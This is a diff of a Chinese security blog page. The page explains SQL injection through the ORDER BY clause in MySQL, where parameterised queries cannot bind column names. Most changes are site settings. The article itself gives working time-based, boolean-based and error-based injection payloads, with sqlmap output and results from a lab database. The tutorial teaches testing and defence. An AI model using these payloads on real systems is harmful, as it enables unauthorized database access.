@@ -5,27 +5,27 @@
   
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
-  <link rel="dns-prefetch" href="http://yoursite.com">
+  <link rel="dns-prefetch" href="http://wismartzy.github.io">
   <title>MySQL Order By 注入 | Wismartzy&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="如果问一个安全/程序员如何才能防 SQL 注入问题？我想大部分人都会提到使用参数化查询，那是不是这样就高枕无忧了呢？换句话说是不是使用参数化查询后就能杜绝一切 SQL 注入问题呢？答案是否定的，参数化查询是针对参数值的绑定技术解决注入问题，而 SQL 语句中某些字段位置并不支持绑定技术，比如 ORDER BY 关键字后跟列名。当该列名的输入对用户可控时，在 SQL 注入问题上，参数化查询就束手无策">
 <meta property="og:type" content="article">
 <meta property="og:title" content="MySQL Order By 注入">
-<meta property="og:url" content="http://yoursite.com/2016/07/15/MySQL-Order-By-Injection/index.html">
+<meta property="og:url" content="http://wismartzy.github.io/2016/07/15/MySQL-Order-By-Injection/index.html">
 <meta property="og:site_name" content="Wismartzy's Blog">
 <meta property="og:description" content="如果问一个安全/程序员如何才能防 SQL 注入问题？我想大部分人都会提到使用参数化查询，那是不是这样就高枕无忧了呢？换句话说是不是使用参数化查询后就能杜绝一切 SQL 注入问题呢？答案是否定的，参数化查询是针对参数值的绑定技术解决注入问题，而 SQL 语句中某些字段位置并不支持绑定技术，比如 ORDER BY 关键字后跟列名。当该列名的输入对用户可控时，在 SQL 注入问题上，参数化查询就束手无策">
-<meta property="og:image" content="http://yoursite.com/images/mysql-1.png">
-<meta property="og:image" content="http://yoursite.com/images/mysql-2.png">
-<meta property="og:updated_time" content="2017-02-15T14:27:05.000Z">
+<meta property="og:image" content="http://wismartzy.github.io/images/mysql-1.png">
+<meta property="og:image" content="http://wismartzy.github.io/images/mysql-2.png">
+<meta property="og:updated_time" content="2017-03-19T06:33:23.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="MySQL Order By 注入">
 <meta name="twitter:description" content="如果问一个安全/程序员如何才能防 SQL 注入问题？我想大部分人都会提到使用参数化查询，那是不是这样就高枕无忧了呢？换句话说是不是使用参数化查询后就能杜绝一切 SQL 注入问题呢？答案是否定的，参数化查询是针对参数值的绑定技术解决注入问题，而 SQL 语句中某些字段位置并不支持绑定技术，比如 ORDER BY 关键字后跟列名。当该列名的输入对用户可控时，在 SQL 注入问题上，参数化查询就束手无策">
-<meta name="twitter:image" content="http://yoursite.com/images/mysql-1.png">
+<meta name="twitter:image" content="http://wismartzy.github.io/images/mysql-1.png">
   
     <link rel="alternative" href="/atom.xml" title="Wismartzy&#39;s Blog" type="application/atom+xml">
   
   
-    <link rel="icon" href="/favicon.png">
+    <link rel="icon" href="/images/favicon.ico">
   
   <link rel="stylesheet" type="text/css" href="/./main.2d7529.css">
   <style type="text/css">
@@ -49,7 +49,7 @@
 <div class="intrude-less">
 	<header id="header" class="inner">
 		<a href="/" class="profilepic">
-			<img src="null" class="js-avatar">
+			<img src="/images/wismartzy.png" class="js-avatar">
 		</a>
 		<hgroup>
 		  <h1 class="header-author"><a href="/">Wismartzy</a></h1>
@@ -72,8 +72,6 @@
     			
             
     			
-    			<a q-on="click: openSlider(e, 'friends')" href="javascript:void(0)">友链</a>
-    			
             
     			
     			<a q-on="click: openSlider(e, 'aboutme')" href="javascript:void(0)">关于我</a>
@@ -83,7 +81,11 @@
 		<nav class="header-nav">
 			<div class="social">
 				
+					<a class="github" target="_blank" href="https://github.com/wismartzy" title="github"><i class="icon-github"></i></a>
+		        
 					<a class="mail" target="_blank" href="mailto:wismartzy@gmail.com" title="mail"><i class="icon-mail"></i></a>
+		        
+					<a class="rss" target="_blank" href="/atom.xml" title="rss"><i class="icon-rss"></i></a>
 		        
 			</div>
 		</nav>
@@ -101,7 +103,7 @@
 	<div class="intrude-less">
 		<header id="header" class="inner">
 			<div class="profilepic">
-				<img src="null" class="js-avatar">
+				<img src="/images/wismartzy.png" class="js-avatar">
 			</div>
 			<hgroup>
 			  <h1 class="header-author js-header-author">Wismartzy</h1>
@@ -118,7 +120,11 @@
 			<nav class="header-nav">
 				<div class="social">
 					
+						<a class="github" target="_blank" href="https://github.com/wismartzy" title="github"><i class="icon-github"></i></a>
+			        
 						<a class="mail" target="_blank" href="mailto:wismartzy@gmail.com" title="mail"><i class="icon-mail"></i></a>
+			        
+						<a class="rss" target="_blank" href="/atom.xml" title="rss"><i class="icon-rss"></i></a>
 			        
 				</div>
 			</nav>
@@ -164,18 +170,19 @@
       
         <p>如果问一个安全/程序员如何才能防 SQL 注入问题？我想大部分人都会提到使用参数化查询，那是不是这样就高枕无忧了呢？换句话说是不是使用参数化查询后就能杜绝一切 SQL 注入问题呢？答案是否定的，参数化查询是针对参数值的绑定技术解决注入问题，而 SQL 语句中某些字段位置并不支持绑定技术，比如 ORDER BY 关键字后跟列名。当该列名的输入对用户可控时，在 SQL 注入问题上，参数化查询就束手无策了。</p>
 <h2 id="验证漏洞"><a href="#验证漏洞" class="headerlink" title="验证漏洞"></a>验证漏洞</h2><p>查找疑似和 ORDER BY 关键字有关的参数，构造合适 Payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">orderby=ASC,if(1=1,1,(select 1 from information_schema.tables))&amp;key=value</span><br><span class="line">orderby=ASC,if(1=2,1,(select 1 from information_schema.tables))&amp;key=value</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">orderby=ASC,if(1=1,1,(select 1 from information_schema.tables))&amp;key=value</div><div class="line">orderby=ASC,if(1=2,1,(select 1 from information_schema.tables))&amp;key=value</div></pre></td></tr></table></figure>
 <p>因为 select 1 from information_schema.tables 会返回多个行，MySQL 会报“ERROR 1242 (21000): Subquery returns more than 1 row” 的错误，从而整条语句执行失败将无结果返回。</p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先看下 SELECT 语法（MySQL 5.7）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">SELECT</span><br><span class="line">    [ALL | DISTINCT | DISTINCTROW ]</span><br><span class="line">      [HIGH_PRIORITY]</span><br><span class="line">      [MAX_STATEMENT_TIME = N]</span><br><span class="line">      [STRAIGHT_JOIN]</span><br><span class="line">      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]</span><br><span class="line">      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]</span><br><span class="line">    select_expr [, select_expr ...]</span><br><span class="line">    [FROM table_references</span><br><span class="line">      [PARTITION partition_list]</span><br><span class="line">    [WHERE where_condition]</span><br><span class="line">    [GROUP BY &#123;col_name | expr | position&#125;</span><br><span class="line">      [ASC | DESC], ... [WITH ROLLUP]]</span><br><span class="line">    [HAVING where_condition]</span><br><span class="line">    [ORDER BY &#123;col_name | expr | position&#125;</span><br><span class="line">      [ASC | DESC], ...]</span><br><span class="line">    [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;]</span><br><span class="line">    [PROCEDURE procedure_name(argument_list)]</span><br><span class="line">    [INTO OUTFILE &apos;file_name&apos;</span><br><span class="line">        [CHARACTER SET charset_name]</span><br><span class="line">        export_options</span><br><span class="line">      | INTO DUMPFILE &apos;file_name&apos;</span><br><span class="line">      | INTO var_name [, var_name]]</span><br><span class="line">    [FOR UPDATE | LOCK IN SHARE MODE]]</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><a id="more"></a>
+<p>首先看下 SELECT 语法（MySQL 5.7）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">SELECT</div><div class="line">    [ALL | DISTINCT | DISTINCTROW ]</div><div class="line">      [HIGH_PRIORITY]</div><div class="line">      [MAX_STATEMENT_TIME = N]</div><div class="line">      [STRAIGHT_JOIN]</div><div class="line">      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]</div><div class="line">      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]</div><div class="line">    select_expr [, select_expr ...]</div><div class="line">    [FROM table_references</div><div class="line">      [PARTITION partition_list]</div><div class="line">    [WHERE where_condition]</div><div class="line">    [GROUP BY &#123;col_name | expr | position&#125;</div><div class="line">      [ASC | DESC], ... [WITH ROLLUP]]</div><div class="line">    [HAVING where_condition]</div><div class="line">    [ORDER BY &#123;col_name | expr | position&#125;</div><div class="line">      [ASC | DESC], ...]</div><div class="line">    [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;]</div><div class="line">    [PROCEDURE procedure_name(argument_list)]</div><div class="line">    [INTO OUTFILE &apos;file_name&apos;</div><div class="line">        [CHARACTER SET charset_name]</div><div class="line">        export_options</div><div class="line">      | INTO DUMPFILE &apos;file_name&apos;</div><div class="line">      | INTO var_name [, var_name]]</div><div class="line">    [FOR UPDATE | LOCK IN SHARE MODE]]</div></pre></td></tr></table></figure>
 <p>可以看出一条正确 SQL 语句 ORDER BY 关键字后面可以是列名、列别名、列位置，且 ORDER BY 后面不能跟 UNION SELECT 子句，该位置的注入主要有如下姿势：</p>
-<h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET parameter &apos;sort&apos; is vulnerable. Do you want to keep testing the others (if any)? [y/N]</span><br><span class="line">sqlmap identified the following injection points with a total of 46 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: sort (GET)</span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT)</span><br><span class="line">    Payload: sort=1 AND (SELECT * FROM (SELECT(SLEEP(5)))kYbh)</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [security]&gt; SELECT * FROM users ORDER BY 1 AND (SELECT * FROM (SELECT(SLEEP(5)))kYbh);</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">13 rows in set (5.00 sec)</span><br></pre></td></tr></table></figure>
-<h3 id="基于布尔盲注"><a href="#基于布尔盲注" class="headerlink" title="基于布尔盲注"></a>基于布尔盲注</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET parameter &apos;sort&apos; is vulnerable. Do you want to keep testing the others (if any)? [y/N]</span><br><span class="line">sqlmap identified the following injection points with a total of 46 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: sort (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0 boolean-based blind - Parameter replace</span><br><span class="line">    Payload: sort=(SELECT (CASE WHEN (8618=8618) THEN 8618 ELSE 8618*(SELECT 8618 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [security]&gt; SELECT * FROM users ORDER BY (SELECT (CASE WHEN (8618=8618) THEN 8618 ELSE 8618*(SELECT 8618 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END));</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">13 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">GET parameter &apos;sort&apos; is vulnerable. Do you want to keep testing the others (if any)? [y/N]</div><div class="line">sqlmap identified the following injection points with a total of 46 HTTP(s) requests:</div><div class="line">---</div><div class="line">Parameter: sort (GET)</div><div class="line">    Type: AND/OR time-based blind</div><div class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT)</div><div class="line">    Payload: sort=1 AND (SELECT * FROM (SELECT(SLEEP(5)))kYbh)</div><div class="line">---</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">MariaDB [security]&gt; SELECT * FROM users ORDER BY 1 AND (SELECT * FROM (SELECT(SLEEP(5)))kYbh);</div><div class="line">+----+----------+------------+</div><div class="line">| id | username | password   |</div><div class="line">+----+----------+------------+</div><div class="line">|  1 | Dumb     | Dumb       |</div><div class="line">|  2 | Angelina | I-kill-you |</div><div class="line">|  3 | Dummy    | p@ssword   |</div><div class="line">|  4 | secure   | crappy     |</div><div class="line">|  5 | stupid   | stupidity  |</div><div class="line">|  6 | superman | genious    |</div><div class="line">|  7 | batman   | mob!le     |</div><div class="line">|  8 | admin    | admin      |</div><div class="line">|  9 | admin1   | admin1     |</div><div class="line">| 10 | admin2   | admin2     |</div><div class="line">| 11 | admin3   | admin3     |</div><div class="line">| 12 | dhakkan  | dumbo      |</div><div class="line">| 14 | admin4   | admin4     |</div><div class="line">+----+----------+------------+</div><div class="line">13 rows in set (5.00 sec)</div></pre></td></tr></table></figure>
+<h3 id="基于布尔盲注"><a href="#基于布尔盲注" class="headerlink" title="基于布尔盲注"></a>基于布尔盲注</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">GET parameter &apos;sort&apos; is vulnerable. Do you want to keep testing the others (if any)? [y/N]</div><div class="line">sqlmap identified the following injection points with a total of 46 HTTP(s) requests:</div><div class="line">---</div><div class="line">Parameter: sort (GET)</div><div class="line">    Type: boolean-based blind</div><div class="line">    Title: MySQL &gt;= 5.0 boolean-based blind - Parameter replace</div><div class="line">    Payload: sort=(SELECT (CASE WHEN (8618=8618) THEN 8618 ELSE 8618*(SELECT 8618 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))</div><div class="line">---</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">MariaDB [security]&gt; SELECT * FROM users ORDER BY (SELECT (CASE WHEN (8618=8618) THEN 8618 ELSE 8618*(SELECT 8618 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END));</div><div class="line">+----+----------+------------+</div><div class="line">| id | username | password   |</div><div class="line">+----+----------+------------+</div><div class="line">|  1 | Dumb     | Dumb       |</div><div class="line">|  2 | Angelina | I-kill-you |</div><div class="line">|  3 | Dummy    | p@ssword   |</div><div class="line">|  4 | secure   | crappy     |</div><div class="line">|  5 | stupid   | stupidity  |</div><div class="line">|  6 | superman | genious    |</div><div class="line">|  7 | batman   | mob!le     |</div><div class="line">|  8 | admin    | admin      |</div><div class="line">|  9 | admin1   | admin1     |</div><div class="line">| 10 | admin2   | admin2     |</div><div class="line">| 11 | admin3   | admin3     |</div><div class="line">| 12 | dhakkan  | dumbo      |</div><div class="line">| 14 | admin4   | admin4     |</div><div class="line">+----+----------+------------+</div><div class="line">13 rows in set (0.00 sec)</div></pre></td></tr></table></figure>
 <p>下图可以反映验证漏洞环节提到的情况，这也是我在测试过程中常用的验证是否存在注入点的方式。</p>
 <p><img src="/images/mysql-1.png" alt="order by injection-1"></p>
-<h3 id="报错注入（前提是支持报错）"><a href="#报错注入（前提是支持报错）" class="headerlink" title="报错注入（前提是支持报错）"></a>报错注入（前提是支持报错）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [security]&gt; SELECT * FROM users ORDER BY 1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;:10.0.22-MariaDB&apos;</span><br></pre></td></tr></table></figure>
+<h3 id="报错注入（前提是支持报错）"><a href="#报错注入（前提是支持报错）" class="headerlink" title="报错注入（前提是支持报错）"></a>报错注入（前提是支持报错）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">MariaDB [security]&gt; SELECT * FROM users ORDER BY 1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;:10.0.22-MariaDB&apos;</div></pre></td></tr></table></figure>
 <h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>除了 ORDER BY 的注入外，偶尔也会碰到 LIMIT 注入，与 ORDER BY 不同的是，LIMIT 后可以接 UNION SELECT 子句，当然前提是 LIMIT 前没有 ORDER BY 关键字。</p>
 <p><img src="/images/mysql-2.png" alt="order by injection-2"></p>
 <p>从前面的 SELECT 语法中可知，在报错注入姿势上，ORDER BY 和 LIMIT 的利用一致，都是依赖 PROCEDURE 关键字，但该方法也有局限，此方法只适用于 MySQL 小于5.6.6的5.x系列。</p>
@@ -238,7 +245,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2016/07/15/MySQL-Order-By-Injection/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://wismartzy.github.io/2016/07/15/MySQL-Order-By-Injection/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -277,7 +284,7 @@
   
   <div class="duoshuo">
 	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="MySQL-Order-By-Injection" data-title="MySQL Order By 注入" data-url="http://yoursite.com/2016/07/15/MySQL-Order-By-Injection/"></div>
+	<div class="ds-thread" data-thread-key="MySQL-Order-By-Injection" data-title="MySQL Order By 注入" data-url="http://wismartzy.github.io/2016/07/15/MySQL-Order-By-Injection/"></div>
 	<!-- 多说评论框 end -->
 	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 	<script type="text/javascript">
@@ -343,8 +350,6 @@
       
     
       
-      
-      
     
       
       
@@ -356,15 +361,13 @@
     
     
       
-      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'innerArchive')"><a href="javascript:void(0)" q-class="active:innerArchive">所有文章</a></li>
+      <li style="width: 50%" q-on="click: openSlider(e, 'innerArchive')"><a href="javascript:void(0)" q-class="active:innerArchive">所有文章</a></li>
       
         
       
-      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'friends')"><a href="javascript:void(0)" q-class="active:friends">友链</a></li>
-      
         
       
-      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'aboutme')"><a href="javascript:void(0)" q-class="active:aboutme">关于我</a></li>
+      <li style="width: 50%" q-on="click: openSlider(e, 'aboutme')"><a href="javascript:void(0)" q-class="active:aboutme">关于我</a></li>
       
         
     </ul>
@@ -451,18 +454,6 @@
     	</section>
     
 
-    
-    	<section class="tools-section tools-section-friends" q-show="friends">
-  		
-        <ul class="search-ul">
-          
-            <li class="search-li">
-              <a href="http://lvwei.me/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>呆子不开口</a>
-            </li>
-          
-        </ul>
-  		
-    	</section>
     
 
     
